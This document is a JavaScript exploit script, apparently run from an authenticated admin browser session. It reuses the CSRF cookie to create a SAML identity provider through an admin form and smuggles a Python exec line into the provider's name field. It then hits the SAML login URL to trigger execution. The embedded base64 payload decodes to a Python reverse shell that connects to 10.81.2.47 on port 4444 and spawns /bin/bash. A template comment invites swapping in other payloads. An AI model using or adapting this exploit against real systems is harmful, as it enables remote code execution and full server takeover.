  (function() {
     function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
     const id = Math.floor(Math.random() * 9999);
     const slug = 'shell-' + id;

     // Paste your Base64 string here
     // const b64payload = "[PASTE_BASE64_HERE]";
     const b64payload = "aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuODEuMi40NyIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9iYXNoIikK";

     // The Python payload will decode and execute the shell in one line
	const name = `Exploit${id}\nimport base64;exec(base64.b64decode("${b64payload}"))`;
  
       const formData = new FormData();
       formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
       formData.append('name', name);
       formData.append('slug', slug);
       formData.append('protocol', 'saml');
       formData.append('status', 'active');
       formData.append('priority', '0');
       formData.append('use_custom_attribute_map', 'on');
       formData.append('attribute_mapping', '{"email":["mail"]}');
       formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
   protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
   Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
       formData.append('_save', 'Save');
  
       fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
       .then(r => {
           if (r.ok || r.status === 200) {
               console.log("IDP Created. Triggering Shell for: " + slug);
               fetch('/saml2/login/' + slug + '/');
           }
       });
   })();


